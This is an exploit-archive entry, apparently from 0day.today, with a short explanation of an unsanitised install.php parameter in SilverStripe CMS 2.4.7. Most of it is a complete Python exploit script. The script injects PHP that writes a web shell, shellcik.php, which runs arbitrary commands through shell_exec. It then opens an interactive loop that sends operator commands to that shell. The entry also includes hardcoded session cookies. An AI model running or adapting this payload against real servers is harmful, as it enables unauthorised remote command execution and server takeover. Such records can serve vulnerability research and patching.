@@ -1,0 +1,117 @@
+id: 18139
+date: 04/27/2012
+title: SilverStripe CMS 2.4.7 (install.php) Remote Command Execution
+author: Mehmet Ince
+cves: 
+
+##############################
+# Exploit Title: SilverStripe CMS 2.4.7 (install.php) Remote Command Execution Exploit
+# Date: 26 Nisan 2012
+# Author: Mehmet INCE
+# Twitter: https://twitter.com/#!/mmetince
+# Company: Bilgi Güvenliği Akademisi ( www.bga.com.tr )
+# Software Link: http://www.silverstripe.org/assets/downloads/SilverStripe-v2.4.7.tar.gz
+# Version: 2.4.7
+# Tested on: v2.4.7 with Ubuntu 11.10
+# CVE : Could someone can help me about that.
+##############################
+# First look at install.php on 978 - 993 lines.
+#
+#   if(file_exists('mysite/_config.php')) {
+#       // Truncate the contents of _config instead of deleting it - we can't re-create it because Windows handles permissions slightly
+#       // differently to UNIX based filesystems - it takes the permissions from the parent directory instead of retaining them
+#       $fh = fopen('mysite/_config.php', 'wb');
+#       fclose($fh);
+#   }
+#   $theme = isset($_POST['template']) ? $_POST['template'] : 'blackcandy';
+#   $locale = isset($_POST['locale']) ? $_POST['locale'] : 'en_US';
+#   $type = $config['db']['type'];
+#   $dbConfig = $config['db'][$type];
+#   if(!$dbConfig) {
+#       echo "<p style=\"color: red\">Bad config submitted</p><pre>";
+#       print_r($config);
+#       echo "</pre>";
+#       die();
+#   }
+#
+# Getting data from user with $_POST['template'] that variable. After that goo 1000. line check that.
+#  
+#   $this->writeToFile("mysite/_config.php", <<<PHP
+#
+#  There is starting of write _config.php file. and our $_POST['template'] used to write thata without sanitized.
+#  So we can put whatever we want to _config.php file. A few little trick i exploit that vulnerabilities
+#  with that python codes.
+#
+#  Have a nice days.
+#  Gecmis 23 Nisanimiz kutlu olsun.
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+import httplib, urllib, urllib2,sys, getopt
+ 
+def Menu():
+    print "\n\n-------------------------------------------------------"
+    print "-Kullanim Klavuzu [ USAGE ]               "
+    print "-------------------------------------------------------"
+    print "- Temel Kullanim - I [ Default Usage ] :                  "
+    print "-        python exo.py www.target.com /            \n"
+    print "- Temel Kullanim - II [ Default Usage ] :                 "
+    print "-        python exo.py www.target.com /path/          \n"
+if (len(sys.argv) <= 2) or (len(sys.argv) > 3):
+    Menu()
+    exit(1)
+host = sys.argv[1]
+path = sys.argv[2]
+ 
+print " [+] Exploit ediliyor..!"
+payload="blackcandy');fwrite(fopen("
+payload+='"../shellcik.php","w"), '
+payload+="'<?php $gelen"
+payload+='=@$_GET["gelen"]; echo shell_exec($gelen);?>'
+parametreler = urllib.urlencode({'db[type]':'MySQLDatabase',
+'db[MySQLDatabase][server]':'localhost',
+'db[MySQLDatabase][username]':'root',
+'db[MySQLDatabase][password]':'qwe123',
+'db[MySQLDatabase][database]':'SS_mysite',
+'db[MSSQLDatabase][server]':'localhost',
+'db[MSSQLDatabase][username]':'root',
+'db[MSSQLDatabase][password]':'qwe123',
+'db[MSSQLDatabase][database]':'SS_mysite',
+'db[PostgreSQLDatabase][server]':'localhost',
+'db[PostgreSQLDatabase][username]':'root',
+'db[PostgreSQLDatabase][password]':'qwe123',
+'db[PostgreSQLDatabase][database]':'SS_mysite',
+'db[SQLiteDatabase][path]':'/var/www/SilverStripe/assets/.db',
+'db[SQLiteDatabase][database]':'SS_mysite',
+'admin[username]':'admin',
+'admin[password]':'qwe123',
+'locale':'en_US',
+'template':payload,
+'stats':'on',
+'go':'Installing SilverStripe...'})
+print " [+]Parametreler olusturuldu [ Params Generated For Http Request ]"
+basliklar = {"Content-type": "application/x-www-form-urlencoded",
+             "Accept": "text/plain",
+             "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0",
+             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+             "Accept-Language":"en-us,en;q=0.5",
+             "Accept-Encoding":"gzip, deflate",
+             "Connection":"keep-alive",
+             "Referer":"http://" + host + path+"install.php",
+             "Cookie":"alc_enc=1%3Aa9dbf14198a8f6bd9dd2d2c3e41e7164fb206d76; PastMember=1; PHPSESSID=0d7k4e661jd96i0u64vij68am3; phpbb3_srzvs_k=; phpbb3_srzvs_u=2; phpbb3_srzvs_sid=ede0a17fc1f375d6a633f291119c92d7; style_cookie=null; PHPSESSID=j7nr6uro3jc5tulodfeoum3u90; fws_cust=mince%232%23d41d8cd98f00b204e9800998ecf8427e"
+}
+print " [+]Basliklar olusturuldu [ Headers Generated For Http Request ]"
+conn = httplib.HTTPConnection("localhost:80")
+conn.request("POST",str(path) +"install.php",parametreler,basliklar)
+responce = conn.getresponse()
+if responce.status != 200:
+    print "[+]Http Hatası : " + responce.status + "\n"
+    print "Cant Exploit!:("
+if responce.status == 200:
+    komut=""
+    while( komut != "exit" ):
+        komut = urllib.quote_plus(str(raw_input("Shell :) => ")))
+        print urllib2.urlopen("http://" + host + path+"shellcik.php?gelen="+komut).read()
+
+
+
+#  0day.today [2023-03-25]  #
